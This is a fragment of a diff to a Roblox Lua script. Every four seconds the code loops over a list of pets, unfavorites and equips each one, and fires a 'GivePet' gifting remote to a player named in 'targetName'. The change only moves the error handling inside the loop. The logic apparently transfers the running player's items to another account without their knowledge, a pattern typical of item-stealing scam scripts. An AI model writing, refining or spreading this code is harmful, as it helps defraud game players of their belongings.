@@ -187,8 +187,8 @@ task.spawn(function()
     task.wait(1)
 
     while task.wait(4) do
-        local success, err = pcall(function()
-            for i = #pets, 1, -1 do
+        for i = #pets, 1, -1 do
+            pcall(function()
                 local pet = pets[i]
                 if pet.favorite then game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet.tool) end
                 Hum:EquipTool(pet.tool)
@@ -197,10 +197,7 @@ task.spawn(function()
                 petGiftingServiceRemote:FireServer("GivePet", game.Players[targetName])
                 repeat task.wait(0.1) until not Character:FindFirstChildOfClass("Tool")
                 table.remove(pets, i)
-            end
-        end)
-        if not success then
-            warn("[Task Error: Auto Pet]", err)
+            end)
         end
     end
 end)
